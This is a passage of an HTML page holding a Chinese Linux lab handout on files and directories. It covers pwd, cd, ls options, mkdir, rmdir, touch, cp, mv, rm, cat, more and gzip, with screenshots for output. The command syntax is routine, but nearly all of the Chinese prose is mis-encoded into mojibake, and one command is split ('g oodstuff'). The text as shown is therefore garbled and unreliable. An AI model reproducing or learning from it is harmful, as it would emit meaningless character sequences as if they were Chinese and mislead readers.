src="/posts/e11b459a/image-20211029103608022.png" alt="image-20211029103608022"></p><p><img src="/posts/e11b459a/image-20211029103551797.png" alt="image-20211029103551797"></p><h5 id="2-help"><a class="markdownIt-Anchor" href="#2-help"></a> â‘µ #help</h5><p><img src="/posts/e11b459a/image-20211029103740702.png" alt="image-20211029103740702"></p><h5 id="3-å‘½ä»¤-help"><a class="markdownIt-Anchor" href="#3-å‘½ä»¤-help"></a> â‘¶ #å‘½ä»¤ --help</h5><p><img src="/posts/e11b459a/image-20211029103908087.png" alt="image-20211029103908087"></p><h4 id="5-æ–‡æœ¬ç¼–è¾‘å™¨"><a class="markdownIt-Anchor" href="#5-æ–‡æœ¬ç¼–è¾‘å™¨"></a> 5. æ–‡æœ¬ç¼–è¾‘å™¨</h4><p>è¦åœ¨linuxä¸‹ç¼–å†™æ–‡æœ¬æˆ–è¯­è¨€ç¨‹åºï¼Œå¯ä»¥é€‰æ‹©é€‚ç”¨viï¼Œpicoï¼Œjoeï¼Œjoveï¼Œmcç¼–è¾‘å™¨ç­‰è¿™æ ·çš„æ–‡æœ¬æ¨¡å¼ï¼Œè¿˜å¯ä»¥ä½¿ç”¨åƒGeditï¼ŒKateç­‰è§†çª—ç¯å¢ƒä¸‹çš„ç¼–è¾‘å™¨ï¼Œæˆ–æ˜¯ä½¿ç”¨KDevelopï¼Œå®ƒæ˜¯åœ¨linuxä¸‹çš„XWindowä¸‹æ‰§è¡Œçš„C/C++æ•´åˆå¼å¼€å‘ç¯å¢ƒã€‚</p><h2 id="å®éªŒ2-æ–‡ä»¶ç›®å½•ä¸æ“ä½œ"><a class="markdownIt-Anchor" href="#å®éªŒ2-æ–‡ä»¶ç›®å½•ä¸æ“ä½œ"></a> å®éªŒ2 æ–‡ä»¶ç›®å½•ä¸æ“ä½œ</h2><h3 id="ä¸€-å®éªŒç›®çš„-2"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒç›®çš„-2"></a> ä¸€ã€å®éªŒç›®çš„</h3><p>ä½¿å­¦ç”Ÿç†Ÿæ‚‰ç›®å½•ä¸æ–‡ä»¶çš„æ“ä½œ</p><h3 id="äºŒ-å®éªŒè¦æ±‚-2"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒè¦æ±‚-2"></a> äºŒã€å®éªŒè¦æ±‚</h3><p>æœ¬æ¬¡å®éªŒè¦æ±‚å®Œæˆä¸‹åˆ—å†…å®¹ï¼š</p><ul><li>æ˜¾ç¤ºå½“å‰ç›®å½•çš„ç›®å½•å</li><li>æ”¹å˜å½“å‰ç›®å½•</li><li>ä½¿ç”¨lså‘½ä»¤çš„å„ç§é€‰é¡¹æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•å±æ€§</li><li>åˆ›å»ºå’Œåˆ é™¤ç›®å½•</li><li>åˆ›å»º0é•¿åº¦çš„æ–‡ä»¶</li><li>æ‹·è´ã€ç§»åŠ¨ã€é‡å‘½ååŠåˆ é™¤æ–‡ä»¶</li><li>æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹</li><li>å¯¹æ–‡ä»¶å’Œç›®å½•è¿›è¡Œå‹ç¼©å’Œè§£å‹ç¼©</li></ul><h3 id="ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†-2"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†-2"></a> ä¸‰ã€å®éªŒé¢„å¤‡çŸ¥è¯†</h3><h4 id="1-ä»€ä¹ˆæ˜¯æ–‡ä»¶"><a class="markdownIt-Anchor" href="#1-ä»€ä¹ˆæ˜¯æ–‡ä»¶"></a> 1. ä»€ä¹ˆæ˜¯æ–‡ä»¶</h4><p>ä»é€šå¸¸æ„ä¹‰ä¸Šæ¥è¯´ï¼Œæ–‡ä»¶æ˜¯ä¸€äº›æ•°æ®çš„é›†åˆï¼Œè¿™äº›æ•°æ®é€šå¸¸æ˜¯æ–‡æœ¬æˆ–æœºå™¨æ“ä½œç ã€‚ç”¨æˆ·æ‰€åˆ›å»ºçš„å¤§å¤šæ•°æ–‡ä»¶éƒ½æ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œè€Œåœ¨Linuxä¸Šè¿è¡Œçš„å¤§å¤šæ•°ç¨‹åºåˆ™æ˜¯æœºå™¨æ“ä½œç æ–‡ä»¶ã€‚æ¯å½“æ‰§è¡Œä¸€æ¡Linuxå‘½ä»¤æ—¶ï¼Œå°±æ˜¯å‘Šè¯‰è®¡ç®—æœºå»æ‰§è¡ŒæŸä¸ªæ–‡ä»¶æˆ–æŸç»„æ–‡ä»¶ä¸­çš„å‘½ä»¤ï¼Œè¿™æ ·çš„æ–‡ä»¶ä»¥åŠæ°¸ä¹…çš„å½¢å¼å­˜å‚¨åœ¨åƒç£ç›˜æˆ–ç£å¸¦è¿™æ ·çš„ç¨³å®šä»‹è´¨ä¸­ã€‚</p><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œé™¤äº†é€šå¸¸æ„ä¹‰ä¸Šçš„æ–‡ä»¶å¤–ï¼Œæ¯ä¸ªç‰©ç†å®ä½“ä¹Ÿéƒ½æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å‡ºç°çš„ã€‚Linuxç³»ç»Ÿè§†æ‰€æœ‰æ–‡ä»¶ä¸ºç®€å•çš„æ•°æ®å­—èŠ‚åºåˆ—ï¼Œä½†ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºå¯ä»¥å¯¹æ–‡ä»¶å†…å®¹é™„åŠ ç‰¹å®šçš„ç»“æ„ã€‚</p><h4 id="2-ä»€ä¹ˆæ˜¯ç›®å½•"><a class="markdownIt-Anchor" href="#2-ä»€ä¹ˆæ˜¯ç›®å½•"></a> 2. ä»€ä¹ˆæ˜¯ç›®å½•</h4><p>ç›®å½•æ˜¯æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªå•å…ƒï¼Œå®ƒå­˜æ”¾ç€å„ç§æ–‡ä»¶ã€‚äº‹å®ä¸Šï¼ŒLinuxç³»ç»Ÿä¸­çš„æ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯åŒ…å«åœ¨æŸä¸ªç›®å½•ä¸­çš„ã€‚è¿™æ ·çš„å®‰æ’ä¿æŒäº†æ–‡ä»¶çš„ç»„ç»‡ï¼Œå¹¶å‡å°‘ç³»ç»Ÿå¯»æ‰¾æŸä¸€ç‰¹å®šæ–‡ä»¶æ‰€èŠ±çš„æ—¶é—´ã€‚</p><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œç›®å½•å®é™…ä¸Šä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶ã€‚å®ƒä¸åŒ…å«æ–‡æœ¬æˆ–å¯æ‰§è¡Œçš„æœºå™¨æ“ä½œç ï¼Œä½†å®ƒå…·æœ‰æ–‡ä»¶ååˆ—è¡¨å’Œæœ‰å…³è¿™äº›æ–‡ä»¶çš„å…¶å®ƒä¿¡æ¯ã€‚</p><p>ç”±äºç›®å½•ä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶ï¼Œå› æ­¤ä¹Ÿå¯ä»¥æŠŠä¸€ä¸ªç›®å½•æ”¾åˆ°å¦ä¸€ä¸ªç›®å½•ä¸­ã€‚è¿™æœ‰åŠ©äºä½œä¸ºæ•´ä½“è§£é‡Šæ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸ºç³»ç»Ÿå®é™…ä¸Šæ˜¯ç›®å½•å’Œæ–‡ä»¶ç»„æˆçš„å±‚æ¬¡ç»“æ„ã€‚</p><h4 id="3-æ–‡ä»¶çš„å‘½åè§„åˆ™"><a class="markdownIt-Anchor" href="#3-æ–‡ä»¶çš„å‘½åè§„åˆ™"></a> 3. æ–‡ä»¶çš„å‘½åè§„åˆ™</h4><p>ä¸ºäº†åŒºåˆ«å„ä¸ªæ–‡ä»¶ï¼Œå¿…é¡»ç»™æ¯ä¸ªæ–‡ä»¶å–ä¸ªåå­—ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªåˆæ ¼çš„æ–‡ä»¶åç”±å­—æ¯ã€æ•°å­—å’ŒæŸäº›ç‰¹æ®Šç¬¦å·ç»„æˆã€‚æ–‡ä»¶åä¸­ä¸åº”è¯¥åŒ…å«ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦å’Œé€€æ ¼ç¬¦ï¼Œä¹Ÿä¸åº”è¯¥åŒ…å«ä»»ä½•å¯¹shellæœ‰ç‰¹å®šå«ä¹‰çš„å­—ç¬¦ï¼Œè¿™äº›ç‰¹å®šå­—ç¬¦åŒ…æ‹¬ï¼š`!@#$%^&amp;*()|[]{}â€™&quot;;&lt;&gt;/</p><h4 id="4-æ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„"><a class="markdownIt-Anchor" href="#4-æ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„"></a> 4. æ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„</h4><p>Linuxçš„æ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªåŒ…å«æ–‡ä»¶å’Œç›®å½•çš„å±‚æ¬¡ç»“æ„ï¼Œè¢«ç§°ä¸ºç›®å½•æ ‘ã€‚ç›®å½•æ ‘çš„æœ€é¡¶ç«¯åªæœ‰ä¸€ä¸ªç›®å½•ï¼Œè¢«ç§°ä¸ºæ ¹ï¼ˆrootï¼‰ç›®å½•ã€‚æ ¹ç›®å½•ä»¥æ–œçº¿å­—ç¬¦ï¼ˆ/ï¼‰è¡¨ç¤ºï¼Œç”±å®ƒå†åˆ†æ”¯å‡ºè‹¥å¹²å…¶ä»–ç›®å½•å’Œæ–‡ä»¶ï¼Œã€‚è¿™äº›ç›®å½•ä¸­çš„æ¯ä¸€ä¸ªåˆå¯èƒ½å†åˆ†æ”¯å‡ºå…¶ä»–çš„ä¸€äº›ç›®å½•å’Œæ–‡ä»¶ã€‚ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„Linuxæ–‡ä»¶ç³»ç»Ÿçš„éƒ¨åˆ†ç»“æ„ã€‚</p><p><img src="/posts/e11b459a/image-20211029104920799.png" alt="image-20211029104920799"></p><p>åœ¨å›¾ä¸­ï¼Œhomeæ˜¯/çš„å­ç›®å½•ï¼Œjameã€johnå’Œsjpæ˜¯homeçš„å­ç›®å½•ã€‚ç›¸åº”åœ°ï¼Œ/æ˜¯binã€devã€libã€homeå’Œusrç­‰çš„çˆ¶ç›®å½•ï¼Œhomeåˆæ˜¯jameã€johnå’Œsjpçš„çˆ¶ç›®å½•ã€‚</p><h4 id="5-linuxä¸€äº›ä¸»è¦çš„æ ‡å‡†ç›®å½•"><a class="markdownIt-Anchor" href="#5-linuxä¸€äº›ä¸»è¦çš„æ ‡å‡†ç›®å½•"></a> 5. Linuxä¸€äº›ä¸»è¦çš„æ ‡å‡†ç›®å½•</h4><p>/binç›®å½•ä¿å­˜å¼•å¯¼ç³»ç»Ÿæ‰€éœ€è¦çš„å…¨éƒ¨å¯æ‰§è¡Œç¨‹åºä»¥åŠæœ€å¸¸ç”¨çš„Linuxå‘½ä»¤ã€‚</p><p>/bootç›®å½•ç”¨æ¥å­˜æ”¾Linuxå¯åŠ¨æ—¶æ‰€éœ€è¦çš„ä¸€äº›æ•°æ®å’Œæ–‡ä»¶ã€‚</p><p>/devç›®å½•åŒ…å«æœ‰é“¾æ¥ç¡¬ä»¶è®¾å¤‡çš„æ–‡ä»¶ã€‚</p><p>/etcç›®å½•å«ç”¨äºç®¡ç†Linuxç³»ç»Ÿçš„æ–‡ä»¶å’Œå·¥å…·ã€‚</p><p>/homeç›®å½•ç”¨æ¥å­˜æ”¾å„ä¸ªç”¨æˆ·çš„ä¸»ç›®å½•ã€‚</p><p>/libç›®å½•å«æœ‰Cç¼–è¯‘ç¨‹åºæ‰€éœ€è¦çš„å‡½æ•°åº“ã€‚</p><p>/usrç›®å½•åŒ…å«X Windowsç³»ç»Ÿçš„å¯æ‰§è¡Œç¨‹åºã€å‡½æ•°åº“ä»¥åŠæ¸¸æˆç­‰ã€‚</p><h3 id="å››-å®éªŒå†…å®¹-2"><a class="markdownIt-Anchor" href="#å››-å®éªŒå†…å®¹-2"></a> å››ã€å®éªŒå†…å®¹</h3><h4 id="1-æ˜¾ç¤ºå½“å‰ç›®å½•çš„ç›®å½•å"><a class="markdownIt-Anchor" href="#1-æ˜¾ç¤ºå½“å‰ç›®å½•çš„ç›®å½•å"></a> 1. æ˜¾ç¤ºå½“å‰ç›®å½•çš„ç›®å½•å</h4><p>ä½¿ç”¨pwdå‘½ä»¤ï¼Œç¡®è®¤ä½ ç°åœ¨æ‰€å¤„çš„ç›®å½•ã€‚å‘½ä»¤pwdå¯ä»¥å‘Šè¯‰ç”¨æˆ·ç›®å‰æ˜¯åœ¨å“ªä¸ªç›®å½•ä¸­ï¼Œè¿™ä¸€å‘½ä»¤å°†æ˜¾ç¤ºå½“å‰ç›®å½•çš„å…¨è·¯å¾„åã€‚</p><p><img src="/posts/e11b459a/image-20211029111012656.png" alt="image-20211029111012656"></p><h4 id="2-æ”¹å˜å½“å‰ç›®å½•"><a class="markdownIt-Anchor" href="#2-æ”¹å˜å½“å‰ç›®å½•"></a> 2. æ”¹å˜å½“å‰ç›®å½•</h4><p>å‘½ä»¤cdä½¿ç”¨æ–¹å¼ä¸ºcd [ç›®å½•è·¯å¾„å]ï¼Œç”¨äºå˜æ¢å·¥ä½œç›®å½•è‡³æŒ‡å®šç›®å½•ï¼Œ[ç›®å½•è·¯å¾„å]å¯ä¸ºç›¸å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥ä¸ºç»å¯¹è·¯å¾„ã€‚</p><p><img src="/posts/e11b459a/image-20211029111604450.png" alt="image-20211029111604450"></p><h4 id="3-ä½¿ç”¨lså‘½ä»¤çš„å„ç§é€‰é¡¹æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•å±æ€§"><a class="markdownIt-Anchor" href="#3-ä½¿ç”¨lså‘½ä»¤çš„å„ç§é€‰é¡¹æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•å±æ€§"></a> 3. ä½¿ç”¨lså‘½ä»¤çš„å„ç§é€‰é¡¹æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•å±æ€§</h4><p>ç”¨æˆ·ç»å¸¸è¦æŸ¥çœ‹æŸä¸ªç›®å½•ä¸­æœ‰å“ªäº›æ–‡ä»¶å’Œå­ç›®å½•ï¼Œè¿™å¯ä»¥ä½¿ç”¨lså‘½ä»¤æ¥å®Œæˆã€‚lså‘½ä»¤æœ‰éå¸¸å¤šçš„é€‰é¡¹ï¼Œç”¨æ¥ä¿®æ­£lså‘½ä»¤çš„è¡Œä¸ºï¼Œä»¥ä¾¿æ»¡è¶³<br>ç”¨æˆ·çš„ä¸åŒéœ€æ±‚ã€‚</p><ul><li><p>åœ¨æœ€ç®€å•çš„æƒ…å†µä¸‹ï¼Œlså‘½ä»¤å¯ä»¥ä¸å¸¦ä»»ä½•å®å‚ã€‚è¿™æ—¶lså‘½ä»¤å°†ä»¥å­—æ¯é¡ºåºåˆ—å‡ºå½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„åå­—ã€‚</p><ul><li>å‘½ä»¤ä¸ºï¼š$ls</li></ul><p><img src="/posts/e11b459a/image-20211029112513317.png" alt="image-20211029112513317"></p></li><li><p>ä½¿ç”¨å¸¦å‚æ•°â€œlâ€(å°å†™çš„â€œLâ€)çš„lså‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶åã€æ–‡ä»¶çš„ç±»å‹ã€æ–‡ä»¶çš„è®¿é—®æƒé™ã€æ–‡ä»¶çš„é“¾æ¥æ•°ã€æ–‡ä»¶æ‹¥æœ‰è€…åŠå…¶æ‰€å±çš„ç»„ã€æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶æœ€è¿‘ä¸€æ¬¡è¢«ä¿®æ”¹çš„æ—¥æœŸå’Œæ—¶é—´ç­‰å±æ€§ã€‚</p><ul><li>å‘½ä»¤ä¸ºï¼š$ls -l</li></ul><p><img src="/posts/e11b459a/image-20211029112536299.png" alt="image-20211029112536299"></p></li><li><p>æœ‰äº›æƒ…å†µä¸‹å‘½ä»¤lsä»»ä½•è¾“å‡ºï¼Œå¹¶ä¸è¡¨ç¤ºè¯¥ç›®å½•ä¸­æ²¡æœ‰æ–‡ä»¶å’Œå­ç›®å½•ï¼Œå› ä¸ºé€šå¸¸æƒ…å†µä¸‹lså‘½ä»¤å¹¶ä¸æ˜¾ç¤ºéšå«æ–‡ä»¶(æˆ–ç›®å½•) ã€‚è¦æ˜¾ç¤ºéšå«æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å‚æ•°â€œaâ€çš„lså‘½ä»¤ã€‚</p><ul><li>å‘½ä»¤ä¸ºï¼š$ls -a</li></ul><p><img src="/posts/e11b459a/image-20211029112607485.png" alt="image-20211029112607485"></p></li><li><p>è¦åˆ—å‡ºæŸä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬å…¶ä»»ä½•ä¸€å±‚å­ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥ç”¨å¸¦å‚æ•°â€œRâ€çš„lså‘½ä»¤å®ç°ã€‚è¯¥å‘½ä»¤é€’å½’åœ°æ˜¾ç¤ºæŒ‡å®šç›®å½•(æˆ–å½“å‰ç›®å½•)ä¸‹çš„æ‰€æœ‰å†…å®¹ã€‚</p><ul><li>å‘½ä»¤ä¸ºï¼š$ls -R</li></ul><p><img src="/posts/e11b459a/image-20211029112705638.png" alt="image-20211029112705638"></p></li></ul><h4 id="4-åˆ›å»ºå’Œåˆ é™¤ç›®å½•"><a class="markdownIt-Anchor" href="#4-åˆ›å»ºå’Œåˆ é™¤ç›®å½•"></a> 4. åˆ›å»ºå’Œåˆ é™¤ç›®å½•</h4><h5 id="1-åˆ›å»ºç›®å½•"><a class="markdownIt-Anchor" href="#1-åˆ›å»ºç›®å½•"></a> (1) åˆ›å»ºç›®å½•</h5><p>æ¯ä¸ªç”¨æˆ·åœ¨å®é™…ä¸­éƒ½éœ€è¦åˆ›å»ºè‡ªå·±çš„ç›®å½•ï¼Œè¿™æ˜¯é€šè¿‡mkdirå‘½ä»¤æ¥å®Œæˆçš„ã€‚</p><p>è¯­æ³•å½¢å¼ä¸ºï¼š$ mkdir [-p] dirNameï¼Œ<br>ç”¨äºå»ºç«‹åç§°ä¸ºdirName ä¹‹å­ç›®å½•ã€‚å…¶ä¸­ï¼Œå‚æ•°-pç¡®ä¿ç›®å½•åç§°å­˜åœ¨ï¼Œä¸å­˜åœ¨çš„å°±å»ºä¸€ä¸ªã€‚</p><p><img src="/posts/e11b459a/image-20211029113441518.png" alt="image-20211029113441518"></p><h5 id="2-åˆ é™¤ç›®å½•"><a class="markdownIt-Anchor" href="#2-åˆ é™¤ç›®å½•"></a> (2) åˆ é™¤ç›®å½•</h5><p>åˆ é™¤ç›®å½•çš„å‘½ä»¤ä¸ºrmdirï¼Œä½¿ç”¨è¯­æ³•ä¸ºï¼š$rmdir [dirName]</p><p>ä½œç”¨æ˜¯åˆ é™¤ç›®å½•åä¸ºdirNameçš„ç›®å½•ã€‚</p><ul><li>æ³¨æ„ï¼šrmdirå‘½ä»¤ä¸èƒ½åˆ é™¤ä¸€ä¸ªéç©ºçš„ç›®å½•ã€‚</li></ul><p><img src="/posts/e11b459a/image-20211029113655911.png" alt="image-20211029113655911"></p><h4 id="5-åˆ›å»º0é•¿åº¦çš„æ–‡ä»¶"><a class="markdownIt-Anchor" href="#5-åˆ›å»º0é•¿åº¦çš„æ–‡ä»¶"></a> 5. åˆ›å»º0é•¿åº¦çš„æ–‡ä»¶</h4><p>touchå‘½ä»¤ç”¨äºæ”¹å˜æ¡£æ¡ˆçš„æ—¶é—´è®°å½•ã€‚touchä½¿ç”¨æ–¹å¼touch [-acfm] [-r reference-file] [-t MMDDhhmm [[CC][YY][.ss]] [-dtime] [â€“date=time] [â€“time] [â€“version]file1 [file2 â€¦]</p><p>å…¶ä¸­ï¼Œtouchå‘½ä»¤çš„å‚æ•°ä¸ºï¼šaæ”¹å˜æ¡£æ¡ˆçš„è¯»å–æ—¶é—´è®°å½•ã€‚mæ”¹å˜æ¡£æ¡ˆçš„ä¿®æ”¹æ—¶é—´è®°å½•ã€‚cå‡å¦‚ç›®çš„æ¡£æ¡ˆä¸å­˜åœ¨ï¼Œä¸ä¼šå»ºç«‹æ–°çš„æ¡£æ¡ˆã€‚rä½¿ç”¨å‚è€ƒæ–‡ä»¶çš„æ—¶é—´è®°å½•ã€‚dè®¾å®šæ—¶é—´ä¸æ—¥æœŸã€‚tè®¾å®šæ¡£æ¡ˆçš„æ—¶é—´è®°å½•ã€‚</p><p>touchçš„å¦å¤–ä¸€ä¸ªåŠŸèƒ½å°±æ˜¯åˆ›å»ºä¸€ä¸ª0é•¿åº¦çš„æ–‡ä»¶ã€‚<br>ä¾‹å¦‚ï¼Œä½¿ç”¨touchå‘½ä»¤åœ¨OSç›®å½•åˆ›å»ºåä¸ºmyfile1,myfile2çš„ä¸¤ä¸ªæ–‡ä»¶ï¼š<br>$ touch myfile1 myfile2</p><p><img src="/posts/e11b459a/image-20211029114053508.png" alt="image-20211029114053508"></p><h4 id="6-æ‹·è´-ç§»åŠ¨-é‡å‘½ååŠåˆ é™¤æ–‡ä»¶"><a class="markdownIt-Anchor" href="#6-æ‹·è´-ç§»åŠ¨-é‡å‘½ååŠåˆ é™¤æ–‡ä»¶"></a> 6. æ‹·è´ã€ç§»åŠ¨ã€é‡å‘½ååŠåˆ é™¤æ–‡ä»¶</h4><h5 id="1-æ–‡ä»¶çš„æ‹·è´"><a class="markdownIt-Anchor" href="#1-æ–‡ä»¶çš„æ‹·è´"></a> (1) æ–‡ä»¶çš„æ‹·è´</h5><p>ä½¿ç”¨cpå‘½ä»¤å¯ä»¥å°†æŸä¸ªæ–‡ä»¶å¤åˆ¶ä¸€ä»½ï¼Œcpå‘½ä»¤çš„ä¸€èˆ¬è¯­æ³•å½¢å¼ä¸ºå¦‚ä¸‹ï¼šcp &lt;åŸæ–‡ä»¶è·¯å¾„å&gt; &lt;æ–°æ–‡ä»¶è·¯å¾„å&gt;</p><p><img src="/posts/e11b459a/image-20211029114825468.png" alt="image-20211029114825468"></p><h5 id="2-æ–‡ä»¶çš„ç§»åŠ¨å’Œæ–‡ä»¶çš„é‡å‘½å"><a class="markdownIt-Anchor" href="#2-æ–‡ä»¶çš„ç§»åŠ¨å’Œæ–‡ä»¶çš„é‡å‘½å"></a> (2) æ–‡ä»¶çš„ç§»åŠ¨å’Œæ–‡ä»¶çš„é‡å‘½å</h5><ul><li><p>å‘½ä»¤mvå¯ä»¥å¯¹æŸä¸ªæ–‡ä»¶è¿›è¡Œæ”¹åï¼Œä»¥åŠå°†æŸä¸ªæ–‡ä»¶ä»ä¸€ä¸ªæ–‡ä»¶å¤¹ç§»åŠ¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚<br>ä½¿ç”¨æ–¹å¼ï¼šmv [-i] &lt;æ–‡ä»¶åŸè·¯å¾„&gt; &lt;æ–‡ä»¶æ–°è·¯å¾„&gt;<br>è¯´æ˜ï¼šå°†ä¸€ä¸ªæ¡£æ¡ˆç§»è‡³å¦ä¸€æ¡£æ¡ˆï¼Œæˆ–å°†æ•°ä¸ªæ¡£æ¡ˆç§»è‡³å¦ä¸€ç›®å½•ã€‚<br>å‚æ•°ï¼š-i è‹¥ç›®çš„åœ°å·²æœ‰åŒåæ¡£æ¡ˆï¼Œåˆ™å…ˆè¯¢é—®æ˜¯å¦è¦†ç›–æ—§æ¡£</p></li><li><p>æ”¹å</p><p><img src="/posts/e11b459a/image-20211029115420223.png" alt="image-20211029115420223"></p></li><li><p>ç§»åŠ¨</p><p><img src="/posts/e11b459a/image-20211029115710886.png" alt="image-20211029115710886"></p></li></ul><h5 id="3-åˆ é™¤æ–‡ä»¶"><a class="markdownIt-Anchor" href="#3-åˆ é™¤æ–‡ä»¶"></a> (3) åˆ é™¤æ–‡ä»¶</h5><p>åˆ é™¤æ–‡ä»¶å‘½ä»¤ä¸ºï¼šrm<br>ä½¿ç”¨æ–¹å¼ï¼šrm [-options] æ–‡ä»¶å</p><p>optionså‚æ•°ï¼š<br>-i åˆ é™¤å‰é€ä¸€è¯¢é—®ç¡®è®¤ã€‚<br>-f ç›´æ¥åˆ é™¤æ¡£æ¡ˆï¼Œæ— éœ€é€ä¸€ç¡®è®¤ã€‚<br>-r å°†ç›®å½•åŠä»¥ä¸‹ä¹‹æ¡£æ¡ˆé€ä¸€åˆ é™¤ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p><img src="/posts/e11b459a/image-20211029120134543.png" alt="image-20211029120134543"></p><h4 id="7-æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹"><a class="markdownIt-Anchor" href="#7-æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹"></a> 7. æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹</h4><p>catå’Œmoreè¿™ä¸¤ä¸ªå‘½ä»¤å¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ã€‚</p><h5 id="1-catå‘½ä»¤"><a class="markdownIt-Anchor" href="#1-catå‘½ä»¤"></a> (1) catå‘½ä»¤</h5><ul><li><p>ä½¿ç”¨æ–¹å¼ï¼šcat [-option] fileName</p></li><li><p>å‚æ•°ï¼š</p><p>-n ç”±1å¼€å§‹å¯¹æ‰€æœ‰è¾“å‡ºçš„è¡Œæ•°ç¼–å·</p><p>-b å’Œ-n ç›¸ä¼¼ï¼Œä¸è¿‡å¯¹äºç©ºç™½è¡Œä¸ç¼–å·</p><p><img src="/posts/e11b459a/image-20211029120548660.png" alt="image-20211029120548660"></p><p><img src="/posts/e11b459a/image-20211029120612315.png" alt="image-20211029120612315"></p></li></ul><h5 id="2-moreå‘½ä»¤"><a class="markdownIt-Anchor" href="#2-moreå‘½ä»¤"></a> (2) moreå‘½ä»¤</h5><ul><li><p>ä½¿ç”¨æ–¹å¼ï¼šmore [-option] [+/pattern] [+linenum] [fileNames]</p></li><li><p>ä½¿ç”¨èŒƒä¾‹</p><p>ä»ç¬¬20 è¡Œå¼€å§‹æ˜¾ç¤ºtestfile ä¹‹æ¡£æ¡ˆå†…å®¹</p><p><img src="/posts/e11b459a/image-20211029120937071.png" alt="image-20211029120937071"></p><p>æŸ¥çœ‹/etc/passwdæ–‡ä»¶çš„å†…å®¹ï¼š</p><p><img src="/posts/e11b459a/image-20211029121012612.png" alt="image-20211029121012612"></p></li></ul><h4 id="8-å¯¹æ–‡ä»¶å’Œç›®å½•è¿›è¡Œå‹ç¼©å’Œè§£å‹ç¼©"><a class="markdownIt-Anchor" href="#8-å¯¹æ–‡ä»¶å’Œç›®å½•è¿›è¡Œå‹ç¼©å’Œè§£å‹ç¼©"></a> 8. å¯¹æ–‡ä»¶å’Œç›®å½•è¿›è¡Œå‹ç¼©å’Œè§£å‹ç¼©</h4><ul><li><p>å‹ç¼©æ–‡ä»¶å¯ä»¥å‡å°‘æ‰€éœ€çš„å­˜å‚¨ç©ºé—´ï¼Œä¹Ÿå¯ä»¥å‡å°‘ç½‘ç»œä¼ è¾“æ–‡ä»¶æ‰€éœ€çš„æ—¶é—´ï¼Œå› æ­¤å‹ç¼©å’Œè§£å‹ç¼©åœ¨Linuxä¸­å¾ˆå¸¸ç”¨ã€‚Linuxä¸­å‹ç¼©å’Œè§£å‹ç¼©çš„æŒ‡ä»¤å¾ˆå¤šï¼Œå¦‚gzipã€zipã€bzip2ç­‰ç­‰ï¼Œè¿™é‡Œä»‹ç»æ¯”è¾ƒå¸¸ç”¨çš„gzipæŒ‡ä»¤ã€‚</p></li><li><p>ä½¿ç”¨æ–¹æ³•ï¼šgzip [-option] [-S &lt;å‹ç¼©å­—å°¾å­— ç¬¦ä¸²&gt;] [-&lt;å‹ç¼©æ•ˆç‡&gt;] [â€“best/fast] [æ–‡ä»¶]</p></li><li><p>è¡¥å……è¯´æ˜ï¼šgzipæ˜¯ä¸ªä½¿ç”¨å¹¿æ³›çš„å‹ç¼©ç¨‹åºï¼Œæ–‡ä»¶ç»å®ƒå‹ç¼©è¿‡åï¼Œå…¶åç§°åé¢ä¼šå¤šå‡º&quot;.gz&quot;çš„æ‰©å±•åã€‚</p></li><li><p>ä½¿ç”¨èŒƒä¾‹ï¼š</p><ul><li><p>å¯¹æ–‡ä»¶npä½¿ç”¨gzipå‘½ä»¤è¿›è¡Œå‹ç¼©ï¼š<br>$ gzip np</p><p><img src="/posts/e11b459a/image-20211029121428777.png" alt="image-20211029121428777"></p></li><li><p>å°†npå‹ç¼©åçš„æ–‡ä»¶è¿›è¡Œè§£å‹ç¼©å¹¶åˆ—å‡ºè¯¦ç»†ä¿¡æ¯<br>$ gzip -dv np.gz</p><p><img src="/posts/e11b459a/image-20211029121510000.png" alt="image-20211029121510000"></p></li><li><p>å°†goodstuffç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼š<br>$ gzip -r goodstuff</p><p><img src="/posts/e11b459a/image-20211029121702889.png" alt="image-20211029121702889"></p></li><li><p>å¯¹goodstuffç›®å½•è¿›è¡Œè§£å‹ç¼©ï¼š<br>$ gzip â€“dr g oodstuff</p><p><img 